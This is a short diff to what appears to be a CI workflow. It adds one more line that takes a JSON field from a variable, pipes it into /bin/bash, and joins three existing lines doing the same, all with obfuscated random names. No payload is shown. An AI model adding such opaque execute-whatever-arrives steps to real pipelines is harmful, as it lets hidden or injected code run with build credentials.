@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$kjmto1" | jq -r .wxarw030 | /bin/bash
           printf '%s' "$z87" | jq -r .xlb295 | /bin/bash
           echo $lz54 | jq -r .e7 | /bin/bash
+          printf '%s' "$fpu22" | jq -r .nn86285 | /bin/bash
 
       - name: Persist output
         if: always()
